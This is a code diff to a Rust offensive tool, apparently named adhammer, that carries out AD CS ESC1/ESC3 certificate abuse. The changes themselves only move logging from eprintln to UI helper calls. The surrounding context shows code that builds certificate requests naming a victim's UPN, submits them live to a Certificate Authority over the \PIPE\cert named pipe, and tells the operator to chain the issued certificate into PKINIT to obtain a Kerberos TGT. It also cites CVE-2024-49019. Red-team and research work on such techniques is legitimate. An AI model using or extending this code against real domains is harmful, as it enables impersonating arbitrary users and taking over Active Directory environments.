@@ -26,6 +26,7 @@
 //! CVE-2024-49019 — inject EKU via Microsoft Application Policies against
 //! a schema-v1 template).
 
+use crate::ui;
 use anyhow::{Context, Result};
 use clap::Parser;
 
@@ -204,7 +205,7 @@ async fn icpr_esc1_impl(a: IcprEsc1Args, checklist: &mut crate::ui::StageCheckli
             adhammer_core::SecretArtifact::PrivateKey,
             &pem_bytes,
         )?;
-        eprintln!("[+] generated 2048-bit RSA key → {key_path}");
+        ui::ok(&format!("generated 2048-bit RSA key → {key_path}"));
         (pem_bytes, format!("generated 2048-bit → {key_path}"))
     };
     checklist.record_ok("resolve / generate RSA key", key_source);
@@ -260,14 +261,14 @@ async fn icpr_esc1_impl(a: IcprEsc1Args, checklist: &mut crate::ui::StageCheckli
         format!("{} bytes, target UPN={}", csr.len(), a.target_upn),
     );
     std::fs::write(&a.csr_out, &csr)?;
-    eprintln!(
-        "[+] CSR built (variant={:?}, subject CN={}, SAN otherName+UPN={}) → {} ({} bytes)",
+    ui::ok(&format!(
+        "CSR built (variant={:?}, subject CN={}, SAN otherName+UPN={}) → {} ({} bytes)",
         a.esc,
         a.subject,
         a.target_upn,
         a.csr_out,
         csr.len()
-    );
+    ));
 
     // Synthesize a minimal `CertTemplate` — with no LDAP fetch here, this stand-in
     // exists purely to make `IcprClient::marshal_call` preflight pass so the stub
@@ -317,12 +318,12 @@ async fn icpr_esc1_impl(a: IcprEsc1Args, checklist: &mut crate::ui::StageCheckli
             ms_icpr::CERT_SERVER_REQUEST_OPNUM
         ),
     );
-    eprintln!(
-        "[+] marshaled CertServerRequest stub → {} ({} bytes, opnum {})",
+    ui::ok(&format!(
+        "marshaled CertServerRequest stub → {} ({} bytes, opnum {})",
         a.out,
         stub.len(),
         ms_icpr::CERT_SERVER_REQUEST_OPNUM
-    );
+    ));
 
     // Live submit path — enabled via ms-icpr's `network` feature (default on after
     // dcerpc 0.2.3 resolver-cycle fix). Requires --host + --domain + --user.
@@ -335,10 +336,10 @@ async fn icpr_esc1_impl(a: IcprEsc1Args, checklist: &mut crate::ui::StageCheckli
             .user
             .as_deref()
             .ok_or_else(|| anyhow::anyhow!("--user required when --host is set"))?;
-        eprintln!(
-            "[*] submitting to {} \\\\PIPE\\\\cert (CA={}) as {}\\{}",
+        ui::info(&format!(
+            "submitting to {} \\\\PIPE\\\\cert (CA={}) as {}\\{}",
             host, a.ca, domain, user
-        );
+        ));
         let mut client =
             ms_icpr::IcprClient::connect(host, domain, user, &a.password, a.ca.clone())
                 .context("ms_icpr::IcprClient::connect (sealed \\PIPE\\cert)")?;
@@ -372,11 +373,11 @@ async fn icpr_esc1_impl(a: IcprEsc1Args, checklist: &mut crate::ui::StageCheckli
                 let cms_blob =
                     ms_icpr::build_esc3_request(&csr, &agent_cert, &agent_key, signing_time)
                         .context("ms_icpr::build_esc3_request (CMC EOBO)")?;
-                eprintln!(
-                    "[+] built CMS-signed CMC blob ({} bytes) — submitting as enrollment-agent-on-behalf-of {}",
+                ui::ok(&format!(
+                    "built CMS-signed CMC blob ({} bytes) — submitting as enrollment-agent-on-behalf-of {}",
                     cms_blob.len(),
                     a.target_upn
-                );
+                ));
                 client.submit_request_esc3(&template, &cms_blob)
             }
         };
@@ -394,30 +395,30 @@ async fn icpr_esc1_impl(a: IcprEsc1Args, checklist: &mut crate::ui::StageCheckli
                         issued.pem.len()
                     ),
                 );
-                eprintln!(
-                    "[+] cert ISSUED (request_id={}) → {} ({} bytes)",
+                ui::ok(&format!(
+                    "cert ISSUED (request_id={}) → {} ({} bytes)",
                     issued.request_id,
                     cert_path,
                     issued.pem.len()
-                );
-                eprintln!(
-                    "[+] chain into `attack pkinit --cert {} --key {}.key.pem --upn {}` to obtain a TGT",
+                ));
+                ui::note(&format!(
+                    "chain into `attack pkinit --cert {} --key {}.key.pem --upn {}` to obtain a TGT",
                     cert_path, a.csr_out, a.target_upn
-                );
+                ));
             }
             Err(e) => {
-                eprintln!("[-] live submit failed: {e}");
-                eprintln!(
-                    "[i] the offline stub is still available at {} for diagnostic / replay",
+                ui::bad(&format!("live submit failed: {e}"));
+                ui::note(&format!(
+                    "the offline stub is still available at {} for diagnostic / replay",
                     a.out
-                );
+                ));
                 return Err(e.into());
             }
         }
     } else {
-        eprintln!(
+        ui::note(
             "[i] offline mode — no --host provided. To submit live, add: \
-             --host <CA-fqdn> --domain <NETBIOS> --user <user> --password <pw>"
+             --host <CA-fqdn> --domain <NETBIOS> --user <user> --password <pw>",
         );
     }
     Ok(())
